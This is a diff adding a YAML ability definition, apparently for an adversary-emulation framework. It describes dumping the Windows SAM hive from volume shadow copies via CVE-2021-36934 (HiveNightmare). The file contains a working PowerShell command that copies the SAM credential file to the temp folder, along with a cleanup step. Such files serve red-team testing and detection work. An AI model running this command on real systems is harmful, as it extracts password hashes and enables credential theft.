@@ -1,0 +1,21 @@
+---
+- id: 69219b448ba0a75bae573d58d8b6cf40
+  name: dump volume shadow copy hives with System.IO.File
+  description: 'Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1003.002
+    name: 'OS Credential Dumping: Security Account Manager'
+  platforms:
+    windows:
+      psh:
+        command: 1..10 | % { ;  try { [System.IO.File]::Copy("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\SAM"
+          , "$env:TEMP\SAMvss$_", "true") } catch {};  ls "$env:TEMP\SAMvss$_" -ErrorAction
+          Ignore; }
+        payloads: []
+        cleanup: 1..10 | % {;   rm "$env:TEMP\SAMvss$_" -ErrorAction Ignore; }
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
